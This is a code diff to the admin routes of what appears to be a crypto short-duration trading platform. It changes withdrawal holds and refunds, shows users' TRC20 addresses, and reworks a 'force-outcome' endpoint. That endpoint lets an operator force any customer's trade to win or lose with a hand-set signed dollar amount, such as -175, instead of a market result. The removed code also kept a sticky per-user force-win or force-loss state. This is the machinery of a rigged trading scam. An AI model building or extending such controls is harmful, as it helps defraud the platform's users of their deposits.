@@ -447,20 +447,36 @@ router.put(
 
       if (tx.kind === "deposit") {
         user.wallet.set(tx.symbol, current + tx.amount);
+        user.markModified("wallet");
+        await user.save();
       } else if (tx.kind === "withdrawal") {
-        if (current < tx.amount) {
-          return res.status(400).json({
-            success: false,
-            error: "InsufficientFundsError",
-            message: `User has ${current} ${tx.symbol}, needs ${tx.amount}.`,
-          });
+        // Funds already held on submit — only deduct again if not held
+        if (!tx.fundsHeld) {
+          if (current < tx.amount) {
+            return res.status(400).json({
+              success: false,
+              error: "InsufficientFundsError",
+              message: `User has ${current} ${tx.symbol}, needs ${tx.amount}.`,
+            });
+          }
+          user.wallet.set(tx.symbol, current - tx.amount);
+          user.markModified("wallet");
+          await user.save();
         }
-        user.wallet.set(tx.symbol, current - tx.amount);
       }
-      user.markModified("wallet");
-      await user.save();
       tx.status = "approved";
     } else {
+      // Decline: refund held withdrawal amounts
+      if (tx.kind === "withdrawal" && tx.fundsHeld) {
+        const user = await User.findById(tx.user);
+        if (user) {
+          const current = user.wallet.get(tx.symbol) || 0;
+          user.wallet.set(tx.symbol, current + tx.amount);
+          user.markModified("wallet");
+          await user.save();
+          tx.fundsHeld = false;
+        }
+      }
       tx.status = "rejected";
     }
 
@@ -471,12 +487,12 @@ router.put(
 
     const populated = await Transaction.findById(tx._id).populate(
       "user",
-      "username email fullName"
+      "username email fullName trc20Address"
     );
 
     return res.json({
       success: true,
-      message: `Transaction ${action}d.`,
+      message: `Transaction ${action === "approve" ? "approved" : "declined"}.`,
       transaction: populated,
     });
   })
@@ -709,7 +725,7 @@ router.get(
       });
     }
 
-    const [openTrades, recentTrades, recentTx] = await Promise.all([
+    const [openTrades, recentTrades, recentTx, pendingTx] = await Promise.all([
       SecondsTrade.find({ user: user._id, status: "open" }).sort({
         openedAt: -1,
       }),
@@ -720,6 +736,11 @@ router.get(
         .sort({ settledAt: -1 })
         .limit(30),
       Transaction.find({ user: user._id }).sort({ createdAt: -1 }).limit(40),
+      Transaction.find({
+        user: user._id,
+        status: "pending",
+        kind: { $in: ["deposit", "withdrawal"] },
+      }).sort({ createdAt: -1 }),
     ]);
 
     const wallet =
@@ -739,6 +760,8 @@ router.get(
         username: user.username,
         email: user.email,
         phone: user.phone,
+        trc20Address: user.trc20Address || null,
+        profileCompletedAt: user.profileCompletedAt || null,
         role: user.role,
         banned: user.banned,
         tradeControlState: user.tradeControlState,
@@ -751,12 +774,14 @@ router.get(
       openTrades: openTrades.map((t) => serializeAdminTrade(t, user)),
       recentTrades: recentTrades.map((t) => serializeAdminTrade(t, user)),
       transactions: recentTx,
+      pendingDeposits: pendingTx.filter((t) => t.kind === "deposit"),
+      pendingWithdrawals: pendingTx.filter((t) => t.kind === "withdrawal"),
       serverTime: new Date().toISOString(),
     });
   })
 );
 
-// PUT /seconds-trades/:id/force-outcome — Win / Loss for this trade
+// PUT /seconds-trades/:id/force-outcome — Win / Loss with manual USD amount
 router.put(
   "/seconds-trades/:id/force-outcome",
   requireDatabase,
@@ -764,7 +789,7 @@ router.put(
     body("outcome")
       .isIn(["win", "loss", "clear"])
       .withMessage("outcome must be win, loss, or clear."),
-    body("percentage").optional().isFloat({ min: 0, max: 200 }),
+    body("amount").optional().isFloat(),
   ],
   asyncHandler(async (req, res) => {
     const errors = validationResult(req);
@@ -796,38 +821,35 @@ router.put(
       });
     }
 
-    trade.forcedOutcome =
-      req.body.outcome === "clear" ? null : req.body.outcome;
-
-    // Lock % for forced win (profit) or forced loss (extra deduction)
-    if (
-      (req.body.outcome === "win" || req.body.outcome === "loss") &&
-      req.body.percentage != null &&
-      Number.isFinite(Number(req.body.percentage))
-    ) {
-      trade.payoutPercent = Number(req.body.percentage);
-    }
-
-    // Mirror onto user sticky control so % stays consistent
-    if (req.body.outcome === "win" || req.body.outcome === "loss") {
-      const user = await User.findById(trade.user);
-      if (user) {
-        user.tradeControlState =
-          req.body.outcome === "win" ? "force_win" : "force_loss";
-        if (
-          req.body.percentage != null &&
-          Number.isFinite(Number(req.body.percentage))
-        ) {
-          user.tradeControlPercentage = Number(req.body.percentage);
-        }
-        await user.save();
+    if (req.body.outcome === "clear") {
+      trade.forcedOutcome = null;
+      trade.forcedAmount = null;
+    } else {
+      trade.forcedOutcome = req.body.outcome;
+      if (
+        req.body.amount != null &&
+        req.body.amount !== "" &&
+        Number.isFinite(Number(req.body.amount))
+      ) {
+        // Signed Manual Balance Add — keep sign (e.g. 125 or -175), never clamp to %
+        trade.forcedAmount = Number(req.body.amount);
+      } else if (trade.forcedAmount == null) {
+        return res.status(422).json({
+          success: false,
+          error: "ValidationError",
+          message:
+            "Enter Manual Balance Add amount (e.g. 125 for WIN profit, -175 for LOSS).",
+        });
       }
     }
 
     await trade.save();
 
     // If already expired, settle immediately with the forced outcome
-    if (Date.now() >= new Date(trade.expiresAt).getTime()) {
+    if (
+      trade.forcedOutcome &&
+      Date.now() >= new Date(trade.expiresAt).getTime()
+    ) {
       const settled = await settleTrade(trade._id);
       return res.json({
         success: true,
@@ -841,11 +863,9 @@ router.put(
       message:
         req.body.outcome === "clear"
           ? "Forced outcome cleared."
-          : `Forced outcome set to ${req.body.outcome}${
-              req.body.percentage != null
-                ? ` @ ${req.body.percentage}%`
-                : ""
-            }.`,
+          : `Forced ${req.body.outcome} · Manual Balance Add $${Number(
+              trade.forcedAmount || 0
+            ).toFixed(2)} (not %).`,
       trade: serializeAdminTrade(trade),
     });
   })
